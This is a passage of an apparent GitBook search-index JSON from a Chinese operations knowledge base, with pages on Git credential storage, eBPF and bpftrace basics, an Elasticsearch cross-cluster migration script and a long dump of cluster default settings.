{"./":{"url":"./","title":"Introduction","keywords":"","body":"关于 author:运维知识库 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-05-20 05:31:21 "},"CICD/":{"url":"CICD/","title":"CICD","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-12 04:02:54 "},"CICD/git.html":{"url":"CICD/git.html","title":"Git","keywords":"","body":"镜像存储git私钥 git config --global credential.helper store 登录后自动生成 /root/.git-credentials和/root/.gitconfig Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-12 04:02:54 "},"EBPF/":{"url":"EBPF/","title":"EBPF","keywords":"","body":" Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-12 04:02:54 "},"EBPF/1.简介.html":{"url":"EBPF/1.简介.html","title":"1.简介","keywords":"","body":"前言 BPF是一项数据包过滤技术，它源于1992年。BPF是基于寄存器的过滤器，可以有效地工作在基于寄存器结构的CPU上；BPS使用简单无共享的缓存模型，数据包会经过BPF过滤再到内存，可以减少处理的数据量而提高性能 eBPF （extend BPF） Linux 4.x加入了BPF对kprobes,uprobe,tracepoints和perf_events支持。成为内核级子系统，BPF看上去更像内核模块，eBPF可以在无需编译内核、无需加载内核模块的情况下，安全高效的附加代码到内核的各种事件上，对内核进行跟踪、监控（如开发性能分析工具，软件定义网络） eBPF优势 传统Linux内核开发，每次新功能都需要修改内核代码并重新编译打包，内核工程师也可以开发及时加载的内核模块，在运行时加载到Linux内核中，但是每次内核版本更新，都会引起内核API的变化，因此不通的内核需要不同代码的内核模块，假设模块中有错误的代码还会导致内核崩溃BPF具有安全性，BPF程序无需编译内核，并且会验证程序，确保内核本身不崩溃。BPF使用BPFJIT将BPF字节码编译成本地机器字节码，获得本地编译的运行速度 BPF支持的跟踪类型 kprobes：实现内核动态跟踪。 kprobes 可以跟踪到 Linux 内核中的函数入口或返回点，但是不是稳定 ABI 接口，可能会因为内核版本变化导致，导致跟踪失效。 uprobes：用户级别的动态跟踪。与 kprobes 类似，只是跟踪的函数为用户程序中的函数。 tracepoints：内核静态跟踪。tracepoints 是内核开发人员维护的跟踪点，能够提供稳定的 ABI 接口，但是由于是研发人员维护，数量和场景可能受限。 USDT：为用户空间的应用程序提供了静态跟踪点。 perf_events：定时采样和 PMC。 开发方式： BCC&BCC CO-RE(compile once, run everywhere)可移植性对比 BCC开发方式 开发部署： 将BPC C源码嵌入python编写的用户空间应用，然后将源码拷贝到目标机器 执行：目标机器安装LLVM&Clang, 在目标机器现场执行编译、加载、运行 缺点：Clang和LLVM很庞大，分发BPF程序时，还必须分发这个库。这个两个还非常耗费资源，每次编译都要大量消耗系统资源，可能会导致生产问题；拖慢了测试和开发速度 BPF CO-RE开发方式（也是未来主流开发方式，因为移植性更强） CO-RE 引入了BPF加载程序libBPF，这个组件会将内核的BTP和BPF程序联系起来。将编译后的BPF代码适配到目标机器的特定的内核 BPF CO-RE 需要下列组件之间的紧密合作： BTF 类型信息：用于获取内核、BPF 程序类型及 BPF 代码的关键信息， 这也是下面其他部分的基础； 编译器（clang）：给 BPF C 代码提供了表达能力和记录重定位（relocation）信息的能力； BPF loader (libbpf)：将内核的 BTF 与 BPF 程序联系起来， 将编译之后的 BPF 代码适配到目标机器的特定内核； 内核：虽然对 BPF CO-RE 完全不感知，但提供了一些 BPF 高级特性，使某些高级场景成为可能。 为什么从BCC切换到libbpf，`https://www.pingcap.com/blog/why-we-switched-from-bcc-to-libbpf-for-linux-bpf-performance-analysis/ libBPF内核文档： https://docs.kernel.org/bpf/instruction-set.html Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-11-25 05:11:56 "},"EBPF/2.入门：bpftrace.html":{"url":"EBPF/2.入门：bpftrace.html","title":"2.入门：bpftrace","keywords":"","body":"内置只读变量 pid- 进程 ID（内核 tgid） tid- 线程 ID（内核 pid） uid- 用户身份 gid- 群组编号 nsecs- 纳秒时间戳 elapsed- 自 bpftrace 初始化以来的纳秒 numaid- NUMA 节点 ID cpu- 处理器 ID comm- 进程名称 kstack- 内核堆栈跟踪 ustack- 用户堆栈跟踪 arg0, arg1, ..., argN。- 跟踪函数的参数；假定为 64 位宽 sarg0, sarg1, ..., sargN。- 跟踪函数的参数（对于在堆栈上存储参数的程序）；假定为 64 位宽 retval- 跟踪函数的返回值 func- 跟踪函数的名称 probe- 探头的全名 curtask- 当前任务结构为 u64 rand- 作为 u32 的随机数 cgroup- 当前进程的Cgroup ID cpid- 子 pid(u32)，仅对-c command标志有效 $1, $2, ... $N, $#。- bpftrace 程序的位置参数 scratch # 将$x声明为整数 $x = 1; # 将$y声明为字符串 $y = \"hello\"; # 将$z声明为指向结构task_struct的指针 $z = (struct task_struct *)curtask; Map类型 @path[pid] = 111 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-11-25 05:11:56 "},"EBPF/3.BCC.html":{"url":"EBPF/3.BCC.html","title":"3.BCC","keywords":"","body":"BCC BCC是一个为ebpf而生的脚手架 BTF 需要开启BTF，BTF结合libbpf，完成了一次编译，到处运行的特性。自动识别绑定内核方法API Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-07 05:06:14 "},"ElasitcSearch/":{"url":"ElasitcSearch/","title":"Elasitc Search","keywords":"","body":"ES Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-05 02:33:19 "},"ElasitcSearch/ES冷热数据架构.html":{"url":"ElasitcSearch/ES冷热数据架构.html","title":"ES冷热数据架构","keywords":"","body":"热温数据架构 https://www.elastic.co/cn/blog/hot-warm-architecture-in-elasticsearch-5-x Rollover按日期、max_doc滚动索引，控制冷数据分片数量 https://www.elastic.co/cn/blog/managing-time-based-indices-efficiently 高级调优：查找并修复 Elasticsearch 慢查询 https://www.elastic.co/cn/blog/advanced-tuning-finding-and-fixing-slow-elasticsearch-queries Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-01-12 04:02:54 "},"ElasitcSearch/ES跨集群迁移.html":{"url":"ElasitcSearch/ES跨集群迁移.html","title":"ES跨集群迁移","keywords":"","body":"For Python # coding:utf-8 import sys import json import time,datetime from elasticsearch import Elasticsearch from elasticsearch.helpers import bulk from elasticsearch import helpers import time # example # python es_transfer.py '{\"es_source\":\"192.168.11.75:9200\",\"es_target\":\"192.168.11.9:9920\",\"source_index\":\"new_articles\",\"target_index\":\"new_articles\"}' start_time = time.time() data = sys.argv[1] data = json.loads(data) source_str = data['es_source'] target_str = data['es_target'] source_index = data['source_index'] target_index = data['target_index'] # auth username = 'elastic' password = '' es_source = Elasticsearch(source_str,timeout=500) es_target = Elasticsearch(target_str,http_auth=f\"{username}:{password}\", timeout=500) print('from ' + source_str + '\\\\' + source_index + ' to ' + target_str + '\\\\' + target_index) #build index mapping = es_source.indices.get_mapping(index=source_index) mapping = mapping[source_index]['mappings']['_doc'] try: # ----导入对应index的mapping（不需要可以注释）---- es_target.indices.create(index=target_index) es_target.indices.put_mapping(index=target_index,doc_type='_doc',body=mapping) #es_target.indices.put_mapping(index=target_index,doc_type=source_index,body=mapping) print(\"put mapping finish.\") # ----end---- body = {\"query\":{\"match_all\":{}}} #body = {\"size\":10000,\"query\":{\"terms\":{\"record_uid\":[\"1165829\"]}}} #body = {\"query\":{\"match_all\":{}},\"sort\":[{\"tkPaidTime\":{\"order\":\"desc\"}}]} #body = {\"query\":{\"bool\":{\"filter\":[{\"term\":{\"subsidyType\":\"饿了么\"}},{\"term\":{\"type\":1}}]}}} print(body) data = helpers.reindex(client=es_source,source_index=source_index,target_index=target_index,target_client=es_target,query=body,chunk_size=5000, scroll='15m') print('import finish') print(time.time() - start_time) except Exception as e: print(e) #if str(e) == \"RequestError(400, 'index_already_exists_exception', 'already exists')\": # print(\"index already exists\") # body={\"query\":{\"match_all\":{}}} # helpers.reindex(client=es_source,source_index=source_index,target_index=target_index,target_client=es_target,query=body,chunk_size=5000, scroll='15m') # print('import finish') Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-07-05 02:30:48 "},"ElasitcSearch/一个推荐的ElasticSearch配置.html":{"url":"ElasitcSearch/一个推荐的ElasticSearch配置.html","title":"一个推荐的ElasticSearch配置","keywords":"","body":"8核32G内存的ES推荐配置 获取配置`curl -XGET \"http://192.168.11.228:9200/_cluster/settings?include_defaults&flat_settings\" 输出 { \"persistent\": { \"monitoring.collector.kmonitor.enabled\": \"true\" }, \"transient\": {}, \"defaults\": { \"action.auto_create_index\": \"+.*,-*\", \"action.destructive_requires_name\": \"true\", \"action.search.shard_count.limit\": \"9223372036854775807\", \"ali_version\": \"1.8.0.3\", \"apack.ali_codec_service.source_reuse_doc_values.enable_for_open_store\": \"false\", \"apack.ali_codec_service.source_reuse_doc_values.max_fields\": \"50\", \"apack.ali_codec_service.source_reuse_doc_values.strict_max_fields\": \"false\", \"apack.analytic_search.doc_concurrency.concurrent.policy\": \"80%:4;90%:2\", \"apack.analytic_search.doc_concurrency.enabled\": \"false\", \"apack.analytic_search.doc_concurrency.entry_size\": \"200000\", \"apack.analytic_search.doc_concurrency.fixed_block_shift\": \"0\", \"apack.analytic_search.doc_concurrency.fixed_slice_shift\": \"0\", \"apack.analytic_search.doc_concurrency.max_support_block_size\": \"1024\", \"apack.analytic_search.doc_concurrency.max_support_cpu_usage\": \"90\", \"apack.analytic_search.doc_concurrency.max_support_heap_usage\": \"80%\", \"apack.analytic_search.doc_concurrency.min_support_doc\": \"10000\", \"apack.analytic_search.doc_concurrency.min_support_processors\": \"4\", \"apack.analytic_search.doc_concurrency.queue_size\": \"16\", \"apack.analytic_search.doc_concurrency.skip_list_jump_count\": \"5\", \"apack.analytic_search.doc_concurrent_search_thread_pool.queue_size\": \"100\", \"apack.analytic_search.doc_concurrent_search_thread_pool.size\": \"16\", \"apack.cold_search.check_cancelled.init_interval\": \"2048\", \"apack.cold_search.check_cancelled.max_interval\": \"1048576\", \"apack.cold_search.cpu.cold_max\": \"0.7\", \"apack.cold_search.cpu.cold_share\": \"10\", \"apack.cold_search.cpu.enabled\": \"false\", \"apack.cold_search.cpu.normal_share\": \"100\", \"apack.cold_search.cpu.waitTime_s\": \"60\", \"apack.cold_search.mem.cold_delay_interval\": \"5s\", \"apack.cold_search.mem.cold_max_percent\": \"80%\", \"apack.cold_search.mem.delay_interval\": \"2s\", \"apack.cold_search.mem.enabled\": \"false\", \"apack.cold_search.mem.jvm_max_percent\": \"90%\", \"apack.cold_search.mem.use_ajdk_tenant\": \"true\", \"apack.cube.bulk.check.index.interval\": \"500ms\", \"apack.cube.bulk.check.index.retry.count\": \"120\", \"apack.cube.index_black_setting_list\": [], \"apack.cube.shared.delayed_delete_leader_index\": \"12h\", \"apack.cube.shared.follow_cluster.enabled\": \"false\", \"apack.cube.syncmeta.ingore_templates\": [], \"apack.cube.syncmeta.interval\": \"500ms\", \"apack.cube.syncmeta_thread_pool.queue_size\": \"1\", \"apack.cube.syncmeta_thread_pool.size\": \"1\", \"apack.cube.unfollow.interval\": \"0ms\", \"apack.cube.unfollow.wait_force_merge_copy_timeout\": \"30m\", \"apack.doc_values_fetch.queue_size\": \"1000\", \"apack.doc_values_fetch.size\": \"8\", \"apack.fasterbulk.combine.enabled\": \"false\", \"apack.fasterbulk.combine.flush_threshold_size\": \"1mb\", \"apack.fasterbulk.combine.interval\": \"50\", \"apack.fasterbulk.response_cropped.enabled\": \"false\", \"apack.knn.monitoring.collector.kmonitor.enabled\": \"true\", \"apack.qos.limiter.close_connection\": \"false\", \"apack.qos.limiter.custom.tags\": [ \"appName\" ], \"apack.qos.limiter.enabled\": \"false\", \"apack.qos.limiter.fast_reject\": \"true\", \"apack.qos.limiter.ignore_zero_metric_enable\": \"false\", \"apack.qos.limiter.max.threshold.change.rate\": \"10\", \"apack.qos.limiter.meta_data.refresh.interval\": \"30s\", \"apack.qos.limiter.min.threshold\": \"1\", \"apack.qos.limiter.recycle.period\": \"60\", \"apack.qos.limiter.stats.collect.interval\": \"5s\", \"apack.qos.limiter.stats.collect.timeout\": \"1s\", \"apack.qos.monitoring.collector.kmonitor.enabled\": \"true\", \"apack.qos.partial_index_report.enable\": \"false\", \"apack.qos.partial_index_report.interval\": \"5\", \"apack.qos.partial_index_report.sample_interval\": \"40\", \"apack.qos.ratelimit.applier.precision\": \"0.05\", \"apack.qos.ratelimit.coordinator.always_from_stats\": \"false\", \"apack.qos.ratelimit.enabled\": \"false\", \"apack.qos.ratelimit.node.bulk.throughput\": \"0b\", \"apack.qos.ratelimit.node.downgrade.trigger.ratio\": \"1.0\", \"apack.qos.ratelimit.node.search.qps\": \"0\", \"apack.qos.ratelimit.stats.collector.interval\": \"5s\", \"async_search.index_cleanup_interval\": \"1h\", \"base_path\": \"\", \"bootstrap.ctrlhandler\": \"true\", \"bootstrap.memory_lock\": \"true\", \"bootstrap.system_call_filter\": \"true\", \"bucket\": \"\", \"cache.recycler.page.limit.heap\": \"10%\", \"cache.recycler.page.type\": \"CONCURRENT\", \"cache.recycler.page.weight.bytes\": \"1.0\", \"cache.recycler.page.weight.ints\": \"1.0\", \"cache.recycler.page.weight.longs\": \"1.0\", \"cache.recycler.page.weight.objects\": \"0.1\", \"ccr.auto_follow.wait_for_metadata_timeout\": \"60s\", \"ccr.indices.recovery.chunk_size\": \"1mb\", \"ccr.indices.recovery.internal_action_timeout\": \"60s\", \"ccr.indices.recovery.max_bytes_per_sec\": \"40mb\", \"ccr.indices.recovery.max_concurrent_file_chunks\": \"5\", \"ccr.indices.recovery.recovery_activity_timeout\": \"60s\", \"ccr.wait_for_metadata_timeout\": \"60s\", \"chunk_size\": \"1gb\", \"client.transport.ignore_cluster_name\": \"false\", \"client.transport.nodes_sampler_interval\": \"5s\", \"client.transport.ping_timeout\": \"5s\", \"client.transport.sniff\": \"false\", \"client.type\": \"node\", \"cluster.auto_shrink_voting_configuration\": \"true\", \"cluster.blocks.read_only\": \"false\", \"cluster.blocks.read_only_allow_delete\": \"false\", \"cluster.election.back_off_time\": \"100ms\", \"cluster.election.duration\": \"500ms\", \"cluster.election.initial_timeout\": \"100ms\", \"cluster.election.max_timeout\": \"10s\", \"cluster.election.strategy\": \"supports_voting_only\", \"cluster.fault_detection.follower_check.interval\": \"1000ms\", \"cluster.fault_detection.follower_check.retry_count\": \"3\", \"cluster.fault_detection.follower_check.timeout\": \"10000ms\", \"cluster.fault_detection.leader_check.interval\": \"1000ms\", \"cluster.fault_detection.leader_check.retry_count\": \"3\", \"cluster.fault_detection.leader_check.timeout\": \"10000ms\", \"cluster.follower_lag.timeout\": \"90000ms\", \"cluster.force_merge.max_concurrent\": \"-1\", \"cluster.force_merge.set_replica_zero_enable\": \"false\", \"cluster.indices.close.enable\": \"true\", \"cluster.indices.tombstones.size\": \"500\", \"cluster.info.update.interval\": \"30s\", \"cluster.info.update.timeout\": \"15s\", \"cluster.initial_master_nodes\": [ \"172.30.141.67\", \"172.30.141.65\", \"172.30.141.66\" ], \"cluster.join.timeout\": \"60000ms\", \"cluster.max_shards_per_node\": \"1000\", \"cluster.max_voting_config_exclusions\": \"10\", \"cluster.name\": \"es-cn-9lb31hsip000meyx9\", \"cluster.no_master_block\": \"write\", \"cluster.nodes.reconnect_interval\": \"10s\", \"cluster.openstore.limiter.snapshot_stats\": \"10\", \"cluster.persistent_tasks.allocation.enable\": \"all\", \"cluster.persistent_tasks.allocation.recheck_interval\": \"30s\", \"cluster.publish.info_timeout\": \"10000ms\", \"cluster.publish.timeout\": \"30000ms\", \"cluster.raw_indexing_data_request_enable\": \"false\", \"cluster.remote.connect\": \"true\", \"cluster.remote.connections_per_cluster\": \"3\", \"cluster.remote.full_connect_enable\": \"false\", \"cluster.remote.initial_connect_timeout\": \"30s\", \"cluster.remote.node.attr\": \"\", \"cluster.routing.allocation.allow_rebalance\": \"indices_all_active\", \"cluster.routing.allocation.awareness.attributes\": [], \"cluster.routing.allocation.balance.index\": \"0.55\", \"cluster.routing.allocation.balance.shard\": \"0.45\", \"cluster.routing.allocation.balance.threshold\": \"1.0\", \"cluster.routing.allocation.bipartite.graph.enable\": \"false\", \"cluster.routing.allocation.cluster_concurrent_rebalance\": \"2\", \"cluster.routing.allocation.compute_cold_data_size.enable\": \"false\", \"cluster.routing.allocation.directional.flow.enable\": \"false\", \"cluster.routing.allocation.disk.include_relocations\": \"true\", \"cluster.routing.allocation.disk.reroute_interval\": \"60s\", \"cluster.routing.allocation.disk.threshold_enabled\": \"true\", \"cluster.routing.allocation.disk.watermark.enable_for_single_data_node\": \"false\", \"cluster.routing.allocation.disk.watermark.flood_stage\": \"95%\", \"cluster.routing.allocation.disk.watermark.high\": \"90%\", \"cluster.routing.allocation.disk.watermark.low\": \"85%\", \"cluster.routing.allocation.enable\": \"all\", \"cluster.routing.allocation.exclude._tier\": \"\", \"cluster.routing.allocation.include._tier\": \"\", \"cluster.routing.allocation.index_create_balance_enable\": \"true\", \"cluster.routing.allocation.node_concurrent_incoming_recoveries\": \"2\", \"cluster.routing.allocation.node_concurrent_outgoing_recoveries\": \"2\", \"cluster.routing.allocation.node_concurrent_recoveries\": \"2\", \"cluster.routing.allocation.node_initial_primaries_recoveries\": \"4\", \"cluster.routing.allocation.openstore.watermark\": \"20tb\", \"cluster.routing.allocation.require._tier\": \"\", \"cluster.routing.allocation.same_shard.host\": \"false\", \"cluster.routing.allocation.shard_state.reroute.priority\": \"NORMAL\", \"cluster.routing.allocation.total_shards_per_node\": \"-1\", \"cluster.routing.allocation.type\": \"balanced\", \"cluster.routing.allocation.warm.node.openstore.enable\": \"false\", \"cluster.routing.rebalance.enable\": \"all\", \"cluster.routing.unprefer_nodes_replica_selection\": [], \"cluster.routing.use_adaptive_replica_selection\": \"true\", \"cluster.service.slow_master_task_logging_threshold\": \"10s\", \"cluster.service.slow_task_logging_threshold\": \"30s\", \"cluster.snapshot.info.max_concurrent_fetches\": \"5\", \"compress\": \"false\", \"continue_merge.check_interval\": \"600\", \"continue_merge.enable\": \"false\", \"continue_merge.no_write_interval\": \"1800\", \"discovery.cluster_formation_warning_timeout\": \"10000ms\", \"discovery.find_peers_interval\": \"1000ms\", \"discovery.initial_state_timeout\": \"30s\", \"discovery.probe.connect_timeout\": \"3000ms\", \"discovery.probe.handshake_timeout\": \"1000ms\", \"discovery.request_peers_timeout\": \"3000ms\", \"discovery.seed_hosts\": [ \"172.30.141.67\", \"172.30.141.65\", \"172.30.141.66\" ], \"discovery.seed_providers\": [], \"discovery.seed_resolver.max_concurrent_resolvers\": \"10\", \"discovery.seed_resolver.timeout\": \"5s\", \"discovery.type\": \"zen\", \"discovery.unconfigured_bootstrap_timeout\": \"3s\", \"discovery.zen.bwc_ping_timeout\": \"3s\", \"discovery.zen.commit_timeout\": \"30s\", \"discovery.zen.fd.connect_on_network_disconnect\": \"false\", \"discovery.zen.fd.ping_interval\": \"1s\", \"discovery.zen.fd.ping_retries\": \"3\", \"discovery.zen.fd.ping_timeout\": \"30s\", \"discovery.zen.fd.register_connection_listener\": \"true\", \"discovery.zen.hosts_provider\": [], \"discovery.zen.join_retry_attempts\": \"3\", \"discovery.zen.join_retry_delay\": \"100ms\", \"discovery.zen.join_timeout\": \"60000ms\", \"discovery.zen.master_election.ignore_non_master_pings\": \"false\", \"discovery.zen.master_election.wait_for_joins_timeout\": \"30000ms\", \"discovery.zen.max_pings_from_another_master\": \"3\", \"discovery.zen.minimum_master_nodes\": \"-1\", \"discovery.zen.no_master_block\": \"write\", \"discovery.zen.ping.unicast.concurrent_connects\": \"10\", \"discovery.zen.ping.unicast.hosts\": [], \"discovery.zen.ping.unicast.hosts.resolve_timeout\": \"5s\", \"discovery.zen.ping_timeout\": \"3s\", \"discovery.zen.publish.max_pending_cluster_states\": \"25\", \"discovery.zen.publish_diff.enable\": \"true\", \"discovery.zen.publish_timeout\": \"30s\", \"discovery.zen.send_leave_request\": \"true\", \"discovery.zen.unsafe_rolling_upgrades_enabled\": \"true\", \"endpoint\": \"\", \"enrich.cleanup_period\": \"15m\", \"enrich.coordinator_proxy.max_concurrent_requests\": \"8\", \"enrich.coordinator_proxy.max_lookups_per_request\": \"128\", \"enrich.coordinator_proxy.queue_capacity\": \"1024\", \"enrich.fetch_size\": \"10000\", \"enrich.max_concurrent_policy_executions\": \"50\", \"enrich.max_force_merge_attempts\": \"3\", \"gateway.auto_import_dangling_indices\": \"false\", \"gateway.expected_data_nodes\": \"-1\", \"gateway.expected_master_nodes\": \"-1\", \"gateway.expected_nodes\": \"-1\", \"gateway.recover_after_data_nodes\": \"-1\", \"gateway.recover_after_master_nodes\": \"0\", \"gateway.recover_after_nodes\": \"-1\", \"gateway.recover_after_time\": \"0ms\", \"gateway.slow_write_logging_threshold\": \"10s\", \"gateway.write_dangling_indices_info\": \"true\", \"http.bind_host\": [ \"_site_\" ], \"http.compression\": \"true\", \"http.compression_level\": \"3\", \"http.content_type.required\": \"true\", \"http.cors.allow-credentials\": \"false\", \"http.cors.allow-headers\": \"X-Requested-With,Content-Type,Content-Length\", \"http.cors.allow-methods\": \"OPTIONS,HEAD,GET,POST,PUT,DELETE\", \"http.cors.allow-origin\": \"\", \"http.cors.enabled\": \"false\", \"http.cors.max-age\": \"1728000\", \"http.detailed_errors.enabled\": \"true\", \"http.host\": [ \"_site_\" ], \"http.max_chunk_size\": \"8kb\", \"http.max_content_length\": \"100mb\", \"http.max_header_size\": \"8kb\", \"http.max_initial_line_length\": \"4kb\", \"http.max_warning_header_count\": \"-1\", \"http.max_warning_header_size\": \"-1b\", \"http.netty.max_composite_buffer_components\": \"69905\", \"http.netty.receive_predictor_size\": \"64kb\", \"http.netty.worker_count\": \"0\", \"http.pipelining.max_events\": \"10000\", \"http.port\": \"9200\", \"http.publish_host\": [ \"_site_\" ], \"http.publish_port\": \"-1\", \"http.read_timeout\": \"0ms\", \"http.reset_cookies\": \"false\", \"http.tcp.keep_alive\": \"true\", \"http.tcp.keep_count\": \"-1\", \"http.tcp.keep_idle\": \"-1\", \"http.tcp.keep_interval\": \"-1\", \"http.tcp.no_delay\": \"true\", \"http.tcp.receive_buffer_size\": \"-1b\", \"http.tcp.reuse_address\": \"true\", \"http.tcp.send_buffer_size\": \"-1b\", \"http.tcp_no_delay\": \"true\", \"http.tracer.exclude\": [], \"http.tracer.include\": [], \"http.type\": \"security4\", \"http.type.default\": \"netty4\", \"index.bulk_to_target_node.enable\": \"true\", \"index.codec\": \"default\", \"index.direct_routing.global.enable\": \"false\", \"index.doc_value.compression.block_shift\": \"15\", \"index.doc_value.compression.default\": \"zstd\", \"index.doc_value.compression.zstd_level\": \"3\", \"index.openstore.allocator.name\": \"open_store_allocator\", \"index.openstore.hybrid.delete.internal_action_timeout\": \"10m\", \"index.openstore.hybrid.delete.modified_active_timeout\": \"120m\", \"index.openstore.hybrid.dump.internal_action_timeout\": \"60s\", \"index.openstore.hybrid.file.dump.block.concurrent.number\": \"5\", \"index.openstore.hybrid.file.dump.block.store.available.size.threshold.bytes\": \"214748364800\", \"index.openstore.hybrid.file.dump.file.concurrent.number\": \"50\", \"index.openstore.hybrid.file.dump.size.high.threshold.bytes\": \"9223372036854775807\", \"index.openstore.hybrid.file.dump.size.low.threshold.bytes\": \"9223372036854775807\", \"index.openstore.hybrid.file.dump.time.high.threshold.ms\": \"900000\", \"index.openstore.hybrid.file.dump.time.low.threshold.ms\": \"600000\", \"index.openstore.hybrid.init.timeout.ms\": \"600000\", \"index.openstore.hybrid.openio.local.ufs.path\": \"/ssd/1/hippo_slave\", \"index.openstore.hybrid.openio.reversed.path\": \"/__reversed_for_openio__\", \"index.openstore.hybrid.openio.security.authentication.type\": \"NOSASL\", \"index.openstore.hybrid.openio.ufs_async_block_reader_enabled\": \"false\", \"index.openstore.hybrid.openio.user_client_cache_async_write_enabled\": \"false\", \"index.openstore.hybrid.read.cache.enabled\": \"true\", \"index.openstore.hybrid.write.cache.enabled\": \"true\", \"index.openstore.index_trash.enable\": \"true\", \"index.openstore.openio.enable\": \"true\", \"index.points.same_sort_order_as_index_sort\": \"false\", \"index.postings.compression\": \"zstd\", \"index.postings.pfor.enabled\": \"false\", \"index.recovery.type\": \"\", \"index.source.compression\": \"zstd\", \"index.source.compression.zstd_level\": \"3\", \"index.store.fs.fs_lock\": \"native\", \"index.store.hybrid.openio.audit_logging_enabled\": \"false\", \"index.store.hybrid.openio.block_instream_cache_enabled\": \"true\", \"index.store.hybrid.openio.block_store_quota\": \"1200GB\", \"index.store.hybrid.openio.block_store_space_maintainer_watermark_high_ratio\": \"0.85\", \"index.store.hybrid.openio.block_store_space_maintainer_watermark_low_ratio\": \"0.75\", \"index.store.hybrid.openio.block_worker_client_pool_max\": \"10000\", \"index.store.hybrid.openio.client_cache_enable\": \"true\", \"index.store.hybrid.openio.dir_meta_op_audit_enable\": \"true\", \"index.store.hybrid.openio.ehcache_disk_segments\": \"100\", \"index.store.hybrid.openio.ehcache_entry_size\": \"100\", \"index.store.hybrid.openio.ehcache_write_queue_size\": \"300\", \"index.store.hybrid.openio.fs_lock_enable\": \"false\", \"index.store.hybrid.openio.job_master_embedded_journal_port\": \"20003\", \"index.store.hybrid.openio.job_master_rpc_port\": \"20001\", \"index.store.hybrid.openio.job_master_web_port\": \"20002\", \"index.store.hybrid.openio.job_worker_data_port\": \"30002\", \"index.store.hybrid.openio.job_worker_rpc_port\": \"30001\", \"index.store.hybrid.openio.job_worker_thread_pool_size\": \"100\", \"index.store.hybrid.openio.job_worker_web_port\": \"30003\", \"index.store.hybrid.openio.master_embedded_journal_port\": \"19200\", \"index.store.hybrid.openio.master_rpc_port\": \"19998\", \"index.store.hybrid.openio.master_web_port\": \"19999\", \"index.store.hybrid.openio.multi_client_cache_async_load_enable\": \"true\", \"index.store.hybrid.openio.multi_client_cache_dir\": \"/cache/openio/workspace/page_cache_1,/cache/openio/workspace/page_cache_2,/cache/openio/workspace/page_cache_3\", \"index.store.hybrid.openio.multi_client_cache_disk_size\": \"80GB,1450GB,150GB\", \"index.store.hybrid.openio.multi_client_cache_enable\": \"true\", \"index.store.hybrid.openio.multi_client_cache_mem_size\": \"1GB,1GB,1GB\", \"index.store.hybrid.openio.multi_client_cache_page_size\": \"256KB,256KB,256KB\", \"index.store.hybrid.openio.multi_client_cache_quota_enabled\": \"true,true,true\", \"index.store.hybrid.openio.separate_master_enable\": \"false\", \"index.store.hybrid.openio.ufs_multipart_upload_enable\": \"true\", \"index.store.hybrid.openio.ufs_operate_max_retry_count\": \"3\", \"index.store.hybrid.openio.underfs_object_store_multi_range_chunk_size\": \"256KB\", \"index.store.hybrid.openio.user_client_local_page_enable\": \"false\", \"index.store.hybrid.openio.user_multi_client_cache_load_parallelism\": \"208\", \"index.store.hybrid.openio.work_dir\": \"/cache/openio/workspace\", \"index.store.hybrid.openio.worker_rpc_port\": \"29999\", \"index.store.hybrid.openio.worker_web_port\": \"30000\", \"index.store.hybrid.persist_ratelimit\": \"200MB\", \"index.store.hybrid.persisted_list_sync_interval\": \"30sec\", \"index.store.hybrid.persistence_state_syncer_enabled\": \"true\", \"index.store.hybrid.persistence_state_syncer_interval_ms\": \"10min\", \"index.store.hybrid.persistence_state_syncer_loop_interval_ms\": \"10ms\", \"index.store.hybrid.persistence_state_syncer_md5_check_enabled\": \"false\", \"index.store.hybrid.user_client_local_page_cache_page_size\": \"4KB\", \"index.store.hybrid.user_client_local_page_cache_size\": \"3GB\", \"index.store.hybrid.user_client_local_page_ehcache_store_entry_size\": \"20000\", \"index.store.openio.elastic_cache.config_path\": \"elastic-cache.xml\", \"index.store.openio.elastic_cache.data_path\": \"/cache/ehcache\", \"index.store.openio.elastic_cache.min_upgrade_nanos\": \"30000000000\", \"index.store.openio.elastic_cache.ordered_cache.disk\": \"1450GB\", \"index.store.openio.elastic_cache.ordered_cache.heap\": \"100entries\", \"index.store.openio.elastic_cache.ordered_cache.off_heap\": \"1GB\", \"index.store.openio.elastic_cache.ordered_cache.tti\": \"604800\", \"index.store.openio.elastic_cache.persistent_cache.disk\": \"3GB\", \"index.store.openio.elastic_cache.persistent_cache.heap\": \"100entries\", \"index.store.openio.elastic_cache.persistent_cache.off_heap\": \"1GB\", \"index.store.openio.elastic_cache.persistent_cache.tti\": \"2592000\", \"index.store.openio.elastic_cache.read_enable\": \"true\", \"index.store.openio.elastic_cache.resident_cache.disk\": \"80GB\", \"index.store.openio.elastic_cache.resident_cache.heap\": \"100entries\", \"index.store.openio.elastic_cache.resident_cache.off_heap\": \"2GB\", \"index.store.openio.elastic_cache.resident_cache.tti\": \"2592000\", \"index.store.openio.elastic_cache.temporary_cache_old.disk\": \"100GB\", \"index.store.openio.elastic_cache.temporary_cache_old.heap\": \"100entries\", \"index.store.openio.elastic_cache.temporary_cache_old.off_heap\": \"0b\", \"index.store.openio.elastic_cache.temporary_cache_old.tti\": \"86400\", \"index.store.openio.elastic_cache.temporary_cache_young.disk\": \"50GB\", \"index.store.openio.elastic_cache.temporary_cache_young.heap\": \"100entries\", \"index.store.openio.elastic_cache.temporary_cache_young.off_heap\": \"0b\", \"index.store.openio.elastic_cache.temporary_cache_young.tti\": \"60\", \"index.store.openio.elastic_cache.write_enable\": \"true\", \"index.store.openio.persist_max_internal\": \"1000\", \"index.store.openstore.access_key_id\": \"\", \"index.store.openstore.access_key_secret\": \"\", \"index.store.openstore.bucket_name\": \"oss_bucket\", \"index.store.openstore.endpoint\": \"\", \"index.store.openstore.fs_lock\": \"openstore\", \"index.store.openstore.index_trash_dir\": \"index_trash\", \"index.store.openstore.input_bank_num\": \"80\", \"index.store.openstore.input_block_shift\": \"18\", 